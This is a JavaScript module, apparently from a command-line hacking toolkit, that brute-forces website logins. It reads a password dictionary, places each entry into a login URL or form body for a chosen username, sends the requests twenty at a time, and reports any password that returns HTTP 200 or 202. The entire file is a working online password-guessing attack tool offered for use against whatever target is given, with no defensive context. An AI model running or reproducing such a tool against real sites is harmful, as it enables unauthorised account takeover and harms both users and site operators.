"use strict";

// Dependencies
const { runJobs } = require("parallel-park")
const request = require("request-async")
const fs = require("fs")

// Variables
const methods = ["GET", "POST", "PUT", "PATCH"]

var globalArgs;

// Functions
async function bruteforce(dictionary){
    console.log("[Web] Bruteforcing, please wait.")

    var results = await runJobs(
        dictionary,
        async(password, index, max)=>{
            if(globalArgs.method === "GET"){
                const url = globalArgs.url.replace("{{password}}", password)
                var response = await request(url)

                if(response.statusCode === 200 || response.statusCode === 202) return password
            }else{
                const data = globalArgs.data.replace("{{password}}", password)
                
                var response = await request(globalArgs.url, {
                    method: globalArgs.method,
                    headers: {
                        "content-type": "application/x-www-form-urlencoded"
                    },
                    data: data
                })

                if(response.statusCode === 200 || response.statusCode === 202) return password
            }
        },
        {
            concurrency: 20
        }
    )

    results = results.filter((result)=>result)

    results[0] ? console.log("Valid password found:", results[0]) : console.log("No valid password found.")
}

// Main
module.exports = async function(args, program){
    program.requiredOption("-u, --url <url>", "The target website login API.")
    .option("-dt, --data <data>", "he data to send.")
    .requiredOption("-m, --method <method>", "Method to use.(Supported: GET, POST, PUT, PATCH)")
    .requiredOption("-user, --username <username>", "The target username.")
    .requiredOption("-d, --dictionary <dictionary>", "A file that contains passwords.").parse()

    args = program.opts()
    globalArgs = program.opts()

    if(methods.indexOf(args.method) === -1) return console.log("Invalid method.")

    const dictionary = fs.readFileSync(args.dictionary, "utf8").replace(/\r/g, "").split("\n")

    if(args.url.match("{{username}}") && !args.data){
        if(args.method === "GET") return console.log("You can only use GET in url bruteforcing.")

        args.url = args.url.replace("{{username}}", args.username)

        bruteforce(dictionary)
    }else if(!args.url.match("{{username}}")){
        if(!args.data) return console.log("data is required in non GET method.")

        args.data = args.data.replace("{{username}}", args.username)

        bruteforce(dictionary)
    }else{
        console.log("Please use {{username}} & {{password} correctly. Using both in both data & URL is not allowed.")
    }
}